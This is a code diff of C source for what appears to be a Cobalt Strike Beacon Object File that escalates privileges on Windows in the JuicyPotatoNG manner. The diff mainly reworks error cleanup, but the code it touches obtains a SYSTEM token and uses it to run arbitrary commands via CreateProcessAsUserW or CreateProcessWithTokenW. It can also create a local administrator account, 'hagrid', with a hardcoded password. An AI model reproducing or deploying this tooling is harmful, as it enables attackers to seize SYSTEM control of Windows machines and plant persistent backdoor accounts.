@@ -46,7 +46,7 @@ bool IsTokenSystem(HANDLE hToken)
 	}
 	Size = 0;
 	ADVAPI32$GetTokenInformation(hToken, TokenImpersonationLevel, &ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &Size);
-	
+
 	switch (ImpersonationLevel)
 	{
 	case SecurityAnonymous:
@@ -206,7 +206,7 @@ bool CreateAdminUser()
 		BeaconPrintf(CALLBACK_ERROR, "NetUserAdd error: %d", nStatus);
 		return false;
 	}
-	
+
 	DWORD gStatus;
 	LOCALGROUP_MEMBERS_INFO_3 gi;
 	gi.lgrmi3_domainandname = ui.usri1_name;
@@ -348,42 +348,42 @@ _CleanUp:
 
 VOID GetHigh(wchar_t* wProcessPath, wchar_t* wCommandLine, int method)
 {
-	if(!InitBackup())
-	{
-		return;
-	}
 
 	HANDLE hTokenLogon = NULL;
+	HANDLE hToken_SYSMTE = NULL;
+
+        SECURITY_ATTRIBUTES sa;
+        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+        sa.bInheritHandle = TRUE;
+        sa.lpSecurityDescriptor = NULL;
+        STARTUPINFOW startupInfo = { 0 };
+        PROCESS_INFORMATION processInfo = { 0 };
+        startupInfo.cb = sizeof(startupInfo);
+
+	if(!InitBackup())
+	{
+		goto _CleanUp;
+	}
 
 	//add the INTERACTIVE sid ref: https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/
 	//https://stackoverflow.com/questions/5023607/how-to-use-logonuser-properly-to-impersonate-domain-user-from-workgroup-client
 	if (!ADVAPI32$LogonUserA("X", "X", "X", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTokenLogon) || !BeaconUseToken(hTokenLogon))
 	{
 		BeaconPrintf(CALLBACK_ERROR, "LogonUser and impersonate failed: %d\n", KERNEL32$GetLastError());
-		KERNEL32$CloseHandle(hTokenLogon);
-		return;
+		goto _CleanUp;
 	}
 
 	if(!EnumConectPoint())
 	{
-		return;
+		goto _CleanUp;
 	}
 
-        HANDLE hToken_SYSMTE = UTOHANDLE(token_value);
+        hToken_SYSMTE = UTOHANDLE(token_value);
 
 	if (!IsTokenSystem(hToken_SYSMTE)) {
 		BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SYSTEM token with proper impersonate level!");
-		KERNEL32$CloseHandle(hToken_SYSMTE);
-		return;
+		goto _CleanUp;
 	}
-
-	SECURITY_ATTRIBUTES sa;
-	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-	sa.bInheritHandle = TRUE;
-	sa.lpSecurityDescriptor = NULL;
-	STARTUPINFOW startupInfo = { 0 };
-	PROCESS_INFORMATION processInfo = { 0 };
-	startupInfo.cb = sizeof(startupInfo);
 
 	if (method == 2) {
 		//According to document, the process that calls the CreateProcessAsUser function must have the SE_INCREASE_QUOTA_NAME privilege and may require the SE_ASSIGNPRIMARYTOKEN_NAME privilege if the token is not assignable.
@@ -392,8 +392,7 @@ VOID GetHigh(wchar_t* wProcessPath, wchar_t* wCommandLine, int method)
 		BeaconUseToken(hToken_SYSMTE);
 		if (!ADVAPI32$CreateProcessAsUserW(hToken_SYSMTE, wProcessPath, wCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
 			BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUserW failed: %d\n", KERNEL32$GetLastError());
-			KERNEL32$CloseHandle(hToken_SYSMTE);
-			return;
+			goto _CleanUp;
 		}
 		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessAsUserW successfully\n");
 	}
@@ -402,22 +401,22 @@ VOID GetHigh(wchar_t* wProcessPath, wchar_t* wCommandLine, int method)
 		if (CreateAdminUser()) {
 			BeaconPrintf(CALLBACK_OUTPUT, "User hagrid with password P@ss@29hagr!d has been added into administrators");
 		}
-		else {
-			BeaconRevertToken();
-			KERNEL32$CloseHandle(hToken_SYSMTE);
-			return;
-		}
+		goto _CleanUp;
 	}
 	else{
 		if (!ADVAPI32$CreateProcessWithTokenW(hToken_SYSMTE, 0, wProcessPath, wCommandLine, CREATE_NO_WINDOW, 0, NULL, &startupInfo, &processInfo)) {
 			BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW failed: %d\n", KERNEL32$GetLastError());
-			KERNEL32$CloseHandle(hToken_SYSMTE);
-			return;
+			goto _CleanUp;
 		}
 		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessWithTokenW successfully\n");
 	}
 
-	KERNEL32$CloseHandle(hToken_SYSMTE);
+	goto _CleanUp;
+
+_CleanUp:
+	BeaconRevertToken();
+	if(hTokenLogon)   KERNEL32$CloseHandle(hTokenLogon);
+	if(hToken_SYSMTE) KERNEL32$CloseHandle(hToken_SYSMTE);
 
 
 
